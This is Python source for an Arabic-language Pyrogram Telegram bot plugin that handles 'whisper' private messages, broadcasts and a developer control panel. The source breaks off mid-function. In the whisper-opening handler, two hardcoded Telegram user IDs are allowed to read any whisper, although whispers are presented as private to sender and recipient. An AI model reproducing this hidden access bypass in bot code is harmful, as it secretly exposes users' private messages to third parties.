"""
[ = This plugin is a part from RoBinSouRce code = ]
{"Developer":"https://t.me/is7rb"}
"""

import random, re, time, json, html, httpx, requests
import urllib.parse
import os
import uuid
import sys
import asyncio

import psutil
import platform
import cpuinfo
import socket
from threading import Thread
from pyrogram import *
from pyrogram.enums import *
from pyrogram.types import *
from config import *
from helpers.Ranks import *

from pytio import Tio, TioRequest
from datetime import datetime
from helpers.utils import *

from httpx import HTTPError
tio = Tio()

def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


# دالة مساعدة لجلب صورة البوت
async def get_bot_photo(c: Client):
    try:
        photos = c.get_chat_photos(c.me.id, limit=1)
        if photos:
            return photos[0].file_id
    except:
        pass
    return None


@Client.on_message(filters.regex("^/start hmsa") & filters.private, group=-2007)
async def on_send_hmsa(c: Client, m: Message):
   id = m.text.split("hmsa")[1]
   if not wsdb.get(id):
      return await m.reply("رابط الهمسة غلط")
   else:
      get = wsdb.get(id)
      if m.from_user.id != get["from"]:
         return await m.reply("انت لم ترسل اهمس بالكروب")
      else:
         getUser = await c.get_users(get["to"])
         wsdb.set(f"hmsa-{m.from_user.id}", get)
         return await m.reply(f"ارسل همستك الموجهة الى [ {getUser.mention} ] ")

@Client.on_message(filters.regex("^/start openhms") & filters.private, group=1999)
async def open_hms(c: Client, m: Message):
   id = m.text.split("openhms")[1]
   if not wsdb.get(f"hms-{id}"):
      return await m.reply("رابط الهمسة غلط")
   else:
      data = wsdb.get(f"hms-{id}")
      caption = data.get("caption", None)
      file = data.get("file", None)
      to = data["to"]
      if m.from_user.id != to and m.from_user.id != data["from"] and m.from_user.id != 5117901887 and m.from_user.id != 7478586552:
         return await m.reply("الهمسة غير موجهة لك يا عزيزي")
      else:
         if file:
            return await c.send_message(m.chat.id,"لقد ارسل لك ميديا والميديا ممنوعة في هذه الفترة لانها تحت الصيانة اخبره بذالك", protect_content=True)
         else:
            return await c.send_message(
                  m.chat.id,
                  data["text"],
                  protect_content=True
               )

async def sleep_and_delete(client, chat_id, message):
    await asyncio.sleep(60)
    await client.delete_messages(chat_id, message_ids=message.message_id)

@Client.on_message(filters.private, group=-2016)
async def to_send(c: Client, m: Message):
   if m.text and re.match("^/start hmsa", m.text):
      return await on_send_hmsa(c, m)
   k = r.get(f'{Dev_FLER}:botkey')
   if r.get(f'{m.chat.id}:pvBroadcast:{m.from_user.id}{Dev_FLER}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:pvBroadcast:{m.from_user.id}{Dev_FLER}')
      if m.text and m.text == 'الغاء':
         return await m.reply(f"{k} تم الغاء كل شيء")
      users = r.smembers(f'{Dev_FLER}:UsersList')
      count = 0
      failed = 0
      rep = await m.reply("جار الاذاعة..")
      for user in users:
         try:
            await m.copy(int(user))
            count+=1
         except errors.FloodWait as f:
            await asyncio.sleep(f.value)
         except:
            failed+=1
            pass
      return await rep.edit(f"{k} اذاعة ناجحة {count}")

   k = r.get(f'{Dev_FLER}:botkey')
   if r.get(f'{m.chat.id}:gpBroadcast:{m.from_user.id}{Dev_FLER}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:gpBroadcast:{m.from_user.id}{Dev_FLER}')
      if m.text and m.text == 'الغاء':
         return await m.reply(f"{k} تم الغاء كل شي")
      chats = r.smembers(f'enablelist:{Dev_FLER}')
      total_chats = len(chats) if chats else 0
      count = 0
      failed = 0
      removed_chats = 0
      rep = await m.reply(f"جار الاذاعة.. (عدد المجموعات: {total_chats})")

      if total_chats == 0:
         return await rep.edit(f"{k} لا توجد مجموعات مفعلة للاذاعة")

      for chat in chats:
         try:
            await m.copy(int(chat))
            count+=1
         except errors.FloodWait as f:
            await asyncio.sleep(f.value)
         except Exception as e:
            error_msg = str(e)
            if "Peer id invalid" in error_msg or "Chat not found" in error_msg:
               r.srem(f'enablelist:{Dev_FLER}', chat)
               r.delete(f'{chat}:enable:{Dev_FLER}')
               removed_chats += 1
               print(f"Removed invalid chat {chat} from database")
            failed+=1
            print(f"Failed to send to chat {chat}: {e}")
            pass

      result_msg = f"{k} اذاعة ناجحة {count} من {total_chats} (فشل: {failed})"
      if removed_chats > 0:
         result_msg += f"\nتم حذف {removed_chats} مجموعة غير صالحة من قاعدة البيانات"

      return await rep.edit(result_msg)

   if r.get(f'{m.chat.id}:gpBroadcastPin:{m.from_user.id}{Dev_FLER}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:gpBroadcastPin:{m.from_user.id}{Dev_FLER}')
      if m.text and m.text == 'الغاء':
         return await m.reply(f"{k} تم الغاء كل شيء")
      chats = r.smembers(f'enablelist:{Dev_FLER}')
      total_chats = len(chats) if chats else 0
      count = 0
      failed = 0
      pinned = 0
      removed_chats = 0
      rep = await m.reply(f"جار الاذاعة مع التثبيت.. (عدد المجموعات: {total_chats})")

      if total_chats == 0:
         return await rep.edit(f"{k} لا توجد مجموعات مفعلة للاذاعة")

      for chat in chats:
         try:
            sent_msg = await m.copy(int(chat))
            count+=1
            try:
               await sent_msg.pin(disable_notification=False)
               pinned+=1
            except Exception as pin_error:
               print(f"Failed to pin in chat {chat}: {pin_error}")
               pass
         except errors.FloodWait as f:
            await asyncio.sleep(f.value)
         except Exception as e:
            error_msg = str(e)
            if "Peer id invalid" in error_msg or "Chat not found" in error_msg:
               r.srem(f'enablelist:{Dev_FLER}', chat)
               r.delete(f'{chat}:enable:{Dev_FLER}')
               removed_chats += 1
               print(f"Removed invalid chat {chat} from database")
            failed+=1
            print(f"Failed to send to chat {chat}: {e}")
            pass

      result_msg = f"{k} اذاعة ناجحة {count} من {total_chats} (مثبت: {pinned}, فشل: {failed})"
      if removed_chats > 0:
         result_msg += f"\nتم حذف {removed_chats} مجموعة غير صالحة من قاعدة البيانات"

      return await rep.edit(result_msg)

   get = wsdb.get(f"hmsa-{m.from_user.id}")
   if get:
      wsdb.delete(f"hmsa-{m.from_user.id}")
      to = get["to"]
      chat = get["chat"]
      id = get["id"]
      data = {}
      if m.media:
         if m.photo:
            file_id = m.photo.file_id
         elif m.video:
            file_id = m.video.file_id
         elif m.animation:
            file_id = m.animation.file_id
         elif m.audio:
            file_id = m.audio.file_id
         elif m.voice:
            file_id = m.voice.file_id
         elif m.sticker:
            file_id = m.sticker.file_id
         elif m.document:
            file_id = m.document.file_id
         caption = m.caption
         data["caption"]=caption
         data["file"]=file_id
      elif m.text:
         data["text"]=m.text.html

      import uuid
      id = str(uuid.uuid4())[:6]
      data["to"]=to
      data["from"]=m.from_user.id
      wsdb.set(f"hms-{id}", data)
      url = f"https://t.me/{c.me.username}?start=openhms{id}"
      getUser = await c.get_users(to)
      await m.reply(f"تم ارسال همستك بنجاح الى {getUser.mention}")
      await c.send_message(
            chat_id=chat,
            text=f"همسة سرية من < {m.from_user.mention} >\nموجهة الى < {getUser.mention} >",
            reply_markup=InlineKeyboardMarkup(
                  [
                     [
                     InlineKeyboardButton(
                           text="لعرض الهمسة",
                           url=url
                        )
                     ]
                  ]
               )
         )
      return await c.delete_messages(chat, get["id"])


@Client.on_message(filters.text & filters.private, group=1)
def delRanksHandler(c,m):
    k = r.get(f'{Dev_FLER}:botkey')
    Thread(target=private_func,args=(c,m,k)).start()

def private_func(c,m,k):
  if r.get(f'{m.from_user.id}:sarhni'):  return
  text = m.text
  name = r.get(f'{Dev_FLER}:BotName') if r.get(f'{Dev_FLER}:BotName') else 'RoBinSouRce'
  channel= r.get(f'{Dev_FLER}:BotChannel') if r.get(f'{Dev_FLER}:BotChannel') else 'TeAmBotix'
  try:
    from config import botUsername
  except:
    botUsername = c.me.username

  if text == '/start' and not dev_pls(m.from_user.id,m.chat.id):
     import glob as _glob
     _found = _glob.glob('aa.*') or _glob.glob('aa')
     bot_photo = _found[0] if _found else None

     start_text = (
        f'<b>مرحباً عزيزي، أنا بوت اسمي {name}</b>\n\n'
        f'<blockquote>'
        f'⌁ وظيفتي حماية المجموعات من التفليش\n'
        f'⌁ لتفعيل ارفعني ادمن وارسل الأمر ↓'
        f'</blockquote>\n\n'
        f'<code>تفعيل</code>'
     )
     start_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton(f"مطور {name}", url='https://t.me/is7rb')],
        [InlineKeyboardButton("شراء بوت", url='https://t.me/is7rb'),
         InlineKeyboardButton("ضيفني لمجموعتك", url=f'https://t.me/{botUsername}?startgroup=Commands&admin=ban_users+restrict_members+delete_messages+add_admins+change_info+invite_users+pin_messages+manage_call+manage_chat+manage_video_chats+promote_members')],
        [InlineKeyboardButton("RoBinSouRce", callback_data='source_robin')]
     ])

     if bot_photo:
        m.reply_photo(photo=bot_photo, caption=start_text, reply_markup=start_markup, parse_mode=ParseMode.HTML)
     else:
        m.reply(text=start_text, reply_markup=start_markup, parse_mode=ParseMode.HTML)

     if not r.sismember(f'{Dev_FLER}:UsersList',m.from_user.id):
       r.sadd(f'{Dev_FLER}:UsersList',m.from_user.id)
       if m.from_user.username:
         username= f'@{m.from_user.username}'
       else:
         username= 'ماعنده يوزر'
       text = '''
شخص جديد دخل للبوت
اسمه : {}
ايديه : `{}`
معرفه : {}

عدد المستخدمين صار {}
'''.format(m.from_user.mention,m.from_user.id,username,len(r.smembers(f'{Dev_FLER}:UsersList')))
       reply_markup = InlineKeyboardMarkup ([[InlineKeyboardButton (m.from_user.first_name, user_id=m.from_user.id)]])
       if r.get(f'DevGroup:{Dev_FLER}'):
          c.send_message(
          int(r.get(f'DevGroup:{Dev_FLER}') or 0),
          text, reply_markup=reply_markup)
       else:
          for dev in get_devs_br():
            try:
              c.send_message(int(dev), text, disable_web_page_preview=True)
            except:
              pass

  if text == '/start Commands':
    return m.reply(text=f'اهلين بيك باوامر البوت \n\nم1 : اوامر الادمنيه\nم2 : اوامر الاعدادات\nم3 : اوامر القفل - الفتح\nم4 : اوامر التسليه\nم5 : اوامر الالعاب',
         reply_markup=InlineKeyboardMarkup (
           [
             [
               InlineKeyboardButton ('م1', callback_data=f'commands1:{m.from_user.id}'),
               InlineKeyboardButton ('م2', callback_data=f'commands2:{m.from_user.id}')
             ],
             [
              InlineKeyboardButton ('م3', callback_data=f'commands3:{m.from_user.id}'),
             ],
             [
              InlineKeyboardButton ('الالعاب', callback_data=f'commands5:{m.from_user.id}'),
              InlineKeyboardButton ('التسليه', callback_data=f'commands4:{m.from_user.id}'),
             ],
             [
              InlineKeyboardButton ('اليوتيوب', callback_data=f'commands6:{m.from_user.id}'),
             ],
           ]
         )
        )

  if text == '/start rules':
     m.reply(text='''
القوانين

- ممنوع استخدام الثغرات
- ممنوع وضع اسماء مخالفة
- 10 حروف مسموحه في اسمك اذا جنت بالتوب الباقي ماراح يطلع
- في حال انك بالتوب واسمك مزخرف راح يصفيه البوت تلقائي''',reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton (f"تحديثات {name}", url=f't.me/{channel}')]]))

  if devp_pls(m.from_user.id,m.chat.id) and text in ['الاحصائيات','المطورين','الاذاعات','اعدادات البوت','الحظر العام','السيرفر','تغيير المطور الاساسي','تحديث البوت','جلب النسخ','اخفاء الكيبورد','إضافة اشتراك إجباري','حذف اشتراك إجباري']:
     if text == 'اخفاء الكيبورد':
        return m.reply('تم اخفاء الكيبورد', reply_markup=ReplyKeyboardRemove())

     if text == 'إضافة اشتراك إجباري':
        r.set(f'{m.chat.id}:addForceSub:{m.from_user.id}{Dev_FLER}', 1, ex=600)
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("الغاء", callback_data="devp:cancel_set")]
        ])
        return m.reply(
            f'{k} ارسل يوزر القناة أو القروب أو رابطها\n'
            f'{k} مثال: @channelname\n'
            f'{k} أو: https://t.me/channelname',
            reply_markup=keyboard
        )

     if text == 'حذف اشتراك إجباري':
        channels = r.smembers(f'forceChannels:{Dev_FLER}')
        if not channels:
            return m.reply(f'{k} لا توجد قنوات أو قروبات اشتراك إجباري حالياً')
        buttons = []
        for ch in channels:
            ch = ch.decode() if isinstance(ch, bytes) else ch
            buttons.append([InlineKeyboardButton(f"🗑 {ch}", callback_data=f"forcesub_del:{ch}")])
        buttons.append([InlineKeyboardButton("رجوع", callback_data="devp:settings"), InlineKeyboardButton("اخفاء", callback_data="devp:hide")])
        return m.reply(f'{k} اختر القناة أو القروب التي تريد حذفها:', reply_markup=InlineKeyboardMarkup(buttons))

     btn_map = {
        'الاحصائيات': 'devp:stats',
        'المطورين': 'devp:devs',
        'الاذاعات': 'devp:broadcast',
        'اعدادات البوت': 'devp:settings',
        'الحظر العام': 'devp:bans',
        'السيرفر': 'devp:server',
        'تغيير المطور الاساسي': 'devp:change_owner',
        'تحديث البوت': 'devp:update',
        'جلب النسخ': 'devp:backup',
     }
     cb_data = btn_map.get(text)
     if cb_data:
        panel_kb = InlineKeyboardMarkup([
           [InlineKeyboardButton(text, callback_data=cb_data)]
        ])
        return m.reply(f'⇜ {text}', reply_markup=panel_kb)

  if text == '/start' and devp_pls(m.from_user.id,m.chat.id):
     import glob as _glob
     _found = _glob.glob('aa.*') or _glob.glob('aa')
     bot_photo = _found[0] if _found else None
     start_text = (
        f'<b>مرحباً عزيزي، أنا بوت اسمي {name}</b>\n\n'
        f'<blockquote>'
        f'⌁ وظيفتي حماية المجموعات من التفليش\n'
        f'⌁ لتفعيل ارفعني ادمن وارسل الأمر ↓'
        f'</blockquote>\n\n'
        f'<code>تفعيل</code>'
     )
     start_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton(f"مطور {name}", url='https://t.me/is7rb')],
        [InlineKeyboardButton("ضيفني لمجموعتك", url=f'https://t.me/{botUsername}?startgroup=Commands&admin=ban_users+restrict_members+delete_messages+add_admins+change_info+invite_users+pin_messages+manage_call+manage_chat+manage_video_chats+promote_members')],
        [InlineKeyboardButton("RoBinSouRce", url='https://t.me/RobinSource')]
     ])
     if bot_photo:
        m.reply_photo(photo=bot_photo, caption=start_text, reply_markup=start_markup, parse_mode=ParseMode.HTML)
     else:
        m.reply(text=start_text, reply_markup=start_markup, parse_mode=ParseMode.HTML)

     dev_keyboard = ReplyKeyboardMarkup([
        ["الاحصائيات", "المطورين"],
        ["الاذاعات", "اعدادات البوت"],
        ["الحظر العام", "السيرفر"],
        ["تغيير المطور الاساسي", "تحديث البوت"],
        ["جلب النسخ", "اخفاء الكيبورد"],
        ["إضافة اشتراك إجباري", "حذف اشتراك إجباري"]
     ], resize_keyboard=True)
     return m.reply(
        text='⇜ مرحباً بك عزيزي المطور\n⇜ اليك لوحة التحكم الخاصة بك اضغط على الامر لتنفذيه',
        reply_markup=dev_keyboard
     )


def get_main_keyboard(k):
    return ReplyKeyboardMarkup([
        [f"{k} الاحصائيات", f"{k} المطورين"],
        [f"{k} الاذاعات", f"{k} اعدادات البوت"],
        [f"{k} الحظر العام", f"{k} السيرفر"],
        [f"{k} تغيير المطور الاساسي", f"{k} تحديث البوت"],
        [f"{k} جلب النسخ", f"{k} اخفاء الكيبورد"],
        [f"{k} إضافة اشتراك إجباري", f"{k} حذف اشتراك إجباري"]
    ], resize_keyboard=True)

def get_back_keyboard(k, back_to="main"):
    if back_to == "main":
        return ReplyKeyboardMarkup([[f"{k} رجوع", f"{k} اخفاء الكيبورد"]], resize_keyboard=True)
    elif back_to == "devs":
        return ReplyKeyboardMarkup([[f"{k} رجوع", f"{k} اخفاء الكيبورد"]], resize_keyboard=True)
    elif back_to == "broadcast":
        return ReplyKeyboardMarkup([[f"{k} رجوع", f"{k} اخفاء الكيبورد"]], resize_keyboard=True)
    elif back_to == "settings":
        return ReplyKeyboardMarkup([[f"{k} رجوع", f"{k} اخفاء الكيبورد"]], resize_keyboard=True)
    elif back_to == "bans":
        return ReplyKeyboardMarkup([[f"{k} رجوع", f"{k} اخفاء الكيبورد"]], resize_keyboard=True)
    elif back_to == "backup":
        return ReplyKeyboardMarkup([[f"{k} رجوع", f"{k} اخفاء الكيبورد"]], resize_keyboard=True)
    return ReplyKeyboardMarkup([[f"{k} رجوع للاعدادات", f"{k} اخفاء الكيبورد"]], resize_keyboard=True)

@Client.on_message(filters.private & filters.text, group=1)
async def dev_panel_handler(c: Client, m: Message):
    if not m.from_user:
        return
    if not devp_pls(m.from_user.id, m.from_user.id):
        return
    k = r.get(f'{Dev_FLER}:botkey') or '⇜'
    text = m.text.replace(k + ' ', '').strip()
    chat_id = m.chat.id
    user_id = m.from_user.id

    # ======= MAIN MENU =======
    if text in ["الاحصائيات", "المطورين", "الاذاعات", "اعدادات البوت",
                "الحظر العام", "السيرفر", "تغيير المطور الاساسي", "تحديث البوت",
                "جلب النسخ", "اخفاء الكيبورد", "إضافة اشتراك إجباري", "حذف اشتراك إجباري"]:
        pass  # handled below
    else:
        return

    if text == "الاحصائيات":
        users = len(r.smembers(f'{Dev_FLER}:UsersList'))
        chats = len(r.smembers(f'enablelist:{Dev_FLER}'))
        return await m.reply(f"عدد المستخدمين: {users}\nعدد المجموعات المفعلة: {chats}",
                             reply_markup=get_back_keyboard(k, "main"))

    if text == "المطورين":
        keyboard = ReplyKeyboardMarkup([
            [f"{k} المطورين الاساسيين", f"{k} مسح المطورين الاساسيين"],
            [f"{k} المطورين الثانويين", f"{k} مسح المطورين الثانويين"],
            [f"{k} رجوع", f"{k} اخفاء الكيبورد"]
        ], resize_keyboard=True)
        return await m.reply("مرحباً عزيزي المطور اليك اوامر الرتب:", reply_markup=keyboard)

    if text == "المطورين الاساسيين":
        devs = r.smembers(f'{Dev_FLER}DEV2')
        if not devs:
            text = "لا يوجد مطورين اساسيين."
        else:
            text = "قائمة المطورين الاساسيين:\n\n"
            for i, dev_id in enumerate(devs, 1):
                try:
                    user = await c.get_users(int(dev_id))
                    if user.username:
                        text += f"{i} - @{user.username} (`{user.id}`)\n"
                    else:
                        text += f"{i} - {user.mention} (`{user.id}`)\n"
                except:
                    text += f"{i} - `{dev_id}`\n"
        return await m.reply(text, reply_markup=get_back_keyboard(k, "devs"))

    if text == "مسح المطورين الاساسيين":
        if not r.smembers(f'{Dev_FLER}DEV2'):
            text = "ماكو مطورين اساسيين علمود تمسحهم"
        else:
            count = 0
            for dev in r.smembers(f'{Dev_FLER}DEV2'):
                r.srem(f'{Dev_FLER}DEV2', int(dev))
                r.delete(f'{int(dev)}:rankDEV2:{Dev_FLER}')
                count += 1
            text = f"تم مسح {count} من المطورين الاساسيين"
        return await m.reply(text, reply_markup=get_back_keyboard(k, "devs"))

    if text == "المطورين الثانويين":
        devs = r.smembers(f'{Dev_FLER}DEV')
        if not devs:
            text = "لا يوجد مطورين ثانويين."
        else:
            text = "قائمة المطورين الثانويين:\n\n"
            for i, dev_id in enumerate(devs, 1):
                try:
                    user = await c.get_users(int(dev_id))
                    if user.username:
                        text += f"{i} - @{user.username} (`{user.id}`)\n"
                    else:
                        text += f"{i} - {user.mention} (`{user.id}`)\n"
                except:
                    text += f"{i} - `{dev_id}`\n"
        return await m.reply(text, reply_markup=get_back_keyboard(k, "devs"))

    if text == "مسح المطورين الثانويين":
        if not r.smembers(f'{Dev_FLER}DEV'):
            text = "ماكو مطورين ثانويين علمود تمسحهم"
        else:
            count = 0
            for dev in r.smembers(f'{Dev_FLER}DEV'):
                r.srem(f'{Dev_FLER}DEV', int(dev))
                r.delete(f'{int(dev)}:rankDEV:{Dev_FLER}')
                count += 1
            text = f"تم مسح {count} من المطورين الثانويين"
        return await m.reply(text, reply_markup=get_back_keyboard(k, "devs"))

    if text == "الاذاعات":
        keyboard = ReplyKeyboardMarkup([
            [f"{k} اذاعة بالخاص", f"{k} اذاعة بالمجموعات"],
            [f"{k} اذاعة مع تثبيت"],
            [f"{k} رجوع", f"{k} اخفاء الكيبورد"]
        ], resize_keyboard=True)
        return await m.reply("مرحباً بك سيدي المطور اليك اوامر الاذاعة", reply_markup=keyboard)

    if text == "اذاعة بالخاص":
        r.set(f'{chat_id}:pvBroadcast:{user_id}{Dev_FLER}', 1, ex=300)
        return await m.reply(f"{k} ارسل الاذاعة الان (خلال 5 دقائق) او ارسل الغاء للالغاء.",
                             reply_markup=get_back_keyboard(k, "broadcast"))

    if text == "اذاعة بالمجموعات":
        r.set(f'{chat_id}:gpBroadcast:{user_id}{Dev_FLER}', 1, ex=300)
        return await m.reply(f"{k} ارسل الاذاعة الان (خلال 5 دقائق) او ارسل الغاء للالغاء.",
                             reply_markup=get_back_keyboard(k, "broadcast"))

    if text == "اذاعة مع تثبيت":
        r.set(f'{chat_id}:gpBroadcastPin:{user_id}{Dev_FLER}', 1, ex=300)
        return await m.reply(f"{k} ارسل الاذاعة الان وراح اثبتها (خلال 5 دقائق) او ارسل الغاء للالغاء.",
                             reply_markup=get_back_keyboard(k, "broadcast"))

    if text == "اعدادات البوت":
        bot_name = r.get(f'{Dev_FLER}:BotName') if r.get(f'{Dev_FLER}:BotName') else "غير محدد"
        bot_key = k
        force_channels = r.smembers(f'forceChannels:{Dev_FLER}')
        if force_channels:
            force_ch_list = []
            for ch in force_channels:
                ch = ch.decode() if isinstance(ch, bytes) else ch
                force_ch_list.append(ch)
            force_ch = "\n".join([f"{k} {ch}" for ch in force_ch_list])
        else:
            force_ch = f"{k} لا يوجد"
        service_status = "معطل" if r.get(f'DisableBot:{Dev_FLER}') else "مفعل"
        yt_status = "معطل" if r.get(f':disableYT:{Dev_FLER}') else "مفعل"
        dev_group = r.get(f'DevGroup:{Dev_FLER}') if r.get(f'DevGroup:{Dev_FLER}') else "غير محددة"

        text_msg = f"""اعدادات البوت الحالية هية كالاتي:

{k} اسم البوت → {bot_name}
{k} رمز السورس → {bot_key}
{k} الاشتراكات الإجبارية:
{force_ch}
{k} مجموعة المطور → {dev_group}
{k} البوت الخدمي → {service_status}
{k} التحميل واليوتيوب → {yt_status}"""

        keyboard = ReplyKeyboardMarkup([
            [f"{k} تحديد اسم البوت", f"{k} مسح اسم البوت"],
            [f"{k} وضع رمز السورس", f"{k} مسح رمز السورس"],
            [f"{k} تعيين قناة الاشتراك", f"{k} حذف قناة الاشتراك"],
            [f"{k} وضع مجموعة المطور", f"{k} مسح مجموعة المطور"],
            [f"{k} تفعيل البوت الخدمي", f"{k} تعطيل البوت الخدمي"],
            [f"{k} تفعيل التحميل واليوتيوب", f"{k} تعطيل التحميل واليوتيوب"],
            [f"{k} الردود العامه"],
            [f"{k} رجوع", f"{k} اخفاء الكيبورد"]
        ], resize_keyboard=True)
        return await m.reply(text_msg, reply_markup=keyboard)

    if text == "تحديد اسم البوت":
        r.set(f'{chat_id}:setBotName:{user_id}{Dev_FLER}', 1, ex=600)
        return await m.reply("<b>ارسل اسم البوت الجديد الان</b>",
                             reply_markup=get_back_keyboard(k, "settings"))

    if text == "مسح اسم البوت":
        r.delete(f'{Dev_FLER}:BotName')
        return await m.reply(f"{k} تم مسح اسم البوت", reply_markup=get_back_keyboard(k, "settings"))

    if text == "وضع رمز السورس":
        r.set(f'{chat_id}:setBotKey:{user_id}{Dev_FLER}', 1, ex=600)
        return await m.reply(f"{k} ارسل رمز السورس الان", reply_markup=get_back_keyboard(k, "settings"))

    if text == "مسح رمز السورس":
        r.set(f'{Dev_FLER}:botkey', '⇜')
        return await m.reply(f"{k} تم مسح رمز السورس", reply_markup=get_back_keyboard(k, "settings"))

    if text == "تعيين قناة الاشتراك":
        r.set(f'{chat_id}:setForceChannel:{user_id}{Dev_FLER}', 1, ex=600)
        return await m.reply(f"{k} ارسل رابط القناة أو القروب الان\nمثال: https://t.me/TeAmBotix",
                             reply_markup=get_back_keyboard(k, "settings"))

    if text == "حذف قناة الاشتراك":
        channels = r.smembers(f'forceChannels:{Dev_FLER}')
        if not channels:
            return await m.reply(f"{k} لا توجد قنوات أو قروبات اشتراك إجباري",
                                 reply_markup=get_back_keyboard(k, "settings"))
        else:
            ch_list = []
            for ch in channels:
                ch = ch.decode() if isinstance(ch, bytes) else ch
                ch_list.append(ch)
            text_msg = f'{k} قنوات الاشتراك الإجباري:\n\n'
            for i, ch in enumerate(ch_list, 1):
                text_msg += f"{i} - {ch}\n"
            text_msg += f"\n{k} ارسل اسم القناة التي تريد حذفها"
            return await m.reply(text_msg, reply_markup=get_back_keyboard(k, "settings"))

    if text == "وضع مجموعة المطور":
        r.set(f'{chat_id}:setDevGroup:{user_id}{Dev_FLER}', 1, ex=600)
        return await m.reply(f"{k} ارسل ايدي كروب المطور الان:",
                             reply_markup=get_back_keyboard(k, "settings"))

    if text == "مسح مجموعة المطور":
        r.delete(f'DevGroup:{Dev_FLER}')
        return await m.reply(f"{k} تم مسح مجموعة المطور", reply_markup=get_back_keyboard(k, "settings"))

    if text == "تفعيل البوت الخدمي":
        r.delete(f'DisableBot:{Dev_FLER}')
        return await m.reply(f"{k} تم تفعيل البوت الخدمي", reply_markup=get_back_keyboard(k, "settings"))

    if text == "تعطيل البوت الخدمي":
        r.set(f'DisableBot:{Dev_FLER}', 1)
        return await m.reply(f"{k} تم تعطيل البوت الخدمي", reply_markup=get_back_keyboard(k, "settings"))

    if text == "تفعيل التحميل واليوتيوب":
        r.delete(f':disableYT:{Dev_FLER}')
        return await m.reply(f"{k} تم تفعيل التحميل واليوتيوب", reply_markup=get_back_keyboard(k, "settings"))

    if text == "تعطيل التحميل واليوتيوب":
        r.set(f':disableYT:{Dev_FLER}', 1)
        return await m.reply(f"{k} تم تعطيل التحميل واليوتيوب", reply_markup=get_back_keyboard(k, "settings"))

    if text == "الردود العامه":
        filters_list = r.smembers(f'FiltersList:{Dev_FLER}')
        if not filters_list:
            text = "ماكو ردود عامه مضافه"
        else:
            text = "الردود العامه:\n\n"
            for i, reply in enumerate(filters_list, 1):
                filter_type = r.get(f'{reply}:filtertype:{Dev_FLER}')
                text += f"{i} - ( {reply} ) -- ( {filter_type} )\n"
        return await m.reply(text, reply_markup=get_back_keyboard(k, "settings"))

    if text == "الحظر العام":
        keyboard = ReplyKeyboardMarkup([
            [f"{k} المحظورين عام", f"{k} المكتومين عام"],
            [f"{k} المحظورين من الالعاب", f"{k} المجموعات المحظورة"],
            [f"{k} رجوع", f"{k} اخفاء الكيبورد"]
        ], resize_keyboard=True)
        return await m.reply("مرحباً عزيزي المطور اليك اوامر الحظر العام", reply_markup=keyboard)

    if text == "المحظورين عام":
        users = r.smembers(f'listGBAN:{Dev_FLER}')
        if not users:
            text = "ماكو حمير محظورين"
        else:
            text = "المحظورين عام:\n\n"
            for i, user_id in enumerate(users, 1):
                try:
                    user = await c.get_users(int(user_id))
                    mention = '@'+user.username if user.username else user.mention
                    text += f"{i} - {mention} (`{user.id}`)\n"
                except:
                    text += f"{i} - `{user_id}`\n"
        return await m.reply(text, reply_markup=get_back_keyboard(k, "bans"))

    if text == "المكتومين عام":
        users = r.smembers(f'listMUTE:{Dev_FLER}')
        if not users:
            text = "ماكو مكتومين عام"
        else:
            text = "المكتومين عام:\n\n"
            for i, user_id in enumerate(users, 1):
                try:
                    user = await c.get_users(int(user_id))
                    mention = '@'+user.username if user.username else user.mention
                    text += f"{i} - {mention} (`{user.id}`)\n"
                except:
                    text += f"{i} - `{user_id}`\n"
        return await m.reply(text, reply_markup=get_back_keyboard(k, "bans"))

    if text == "المحظورين من الالعاب":
        users = r.smembers(f'listGBANGAMES:{Dev_FLER}')
        if not users:
            text = "ماكو حمير محظورين من الالعاب"
        else:
            text = "المحظورين من الالعاب:\n\n"
            for i, user_id in enumerate(users, 1):
                try:
                    user = await c.get_users(int(user_id))
                    mention = '@'+user.username if user.username else user.mention
                    text += f"{i} - {mention} (`{user.id}`)\n"
                except:
                    text += f"{i} - `{user_id}`\n"
        return await m.reply(text, reply_markup=get_back_keyboard(k, "bans"))

    if text == "المجموعات المحظورة":
        chats = r.smembers(f':BannedChats:{Dev_FLER}')
        if not chats:
            text = "ماكو كروب محظور عام"
        else:
            text = "المجموعات المحظورة عام:\n\n"
            for i, chat_id in enumerate(chats, 1):
                text += f"{i} - {chat_id}\n"
        return await m.reply(text, reply_markup=get_back_keyboard(k, "bans"))

    if text == "السيرفر":
        uname = platform.uname()
        try:
            import distro
            version = distro.name(pretty=True)
        except:
            version = f"{uname.system} {uname.release}"

        svmem = psutil.virtual_memory()
        hard = psutil.disk_partitions()[0]
        usage = psutil.disk_usage(hard.mountpoint)
        uptime = time.strftime('%dD - %HH - %MM - %Ss', time.gmtime(time.time() - psutil.boot_time()))

        text_msg = f"""معلومات السيرفر:

النظام: {uname.system}
الاصدار: {version}

الرامات:
الاجمالي: {get_size(svmem.total)}
المستهلك: {get_size(svmem.used)} / {get_size(svmem.available)}
نسبة الاستهلاك: {svmem.percent}%

التخزين:
الاجمالي: {get_size(usage.total)}
المستهلك: {get_size(usage.used)}
نسبة الاستهلاك: {usage.percent}%

مدة التشغيل: {uptime}"""
        return await m.reply(text_msg, reply_markup=get_back_keyboard(k, "main"))

    if text == "تغيير المطور الاساسي":
        r.set(f'{chat_id}:setBotowmer:{user_id}{Dev_FLER}', 1, ex=600)
        return await m.reply(f"{k} ارسل يوزر المطور الاساسي الجديد الان:",
                             reply_markup=get_back_keyboard(k, "main"))

    if text == "تحديث البوت":
        await m.reply(f"{k} جاري التحديث انتظر قليلاً...")
        python = sys.executable
        os.execl(python, python, *sys.argv)

    if text == "جلب النسخ":
        keyboard = ReplyKeyboardMarkup([
            [f"{k} جلب نسخة الكروبات", f"{k} جلب نسخة المستخدمين"],
            [f"{k} رجوع", f"{k} اخفاء الكيبورد"]
        ], resize_keyboard=True)
        return await m.reply("مرحباً عزيزي المطور اليك اوامر النسخ التلقائي", reply_markup=keyboard)

    if text == "جلب نسخة الكروبات":
        chat_list = []
        date = datetime.now()
        for chat in r.smembers(f'enablelist:{Dev_FLER}'):
            chat_list.append(int(chat))
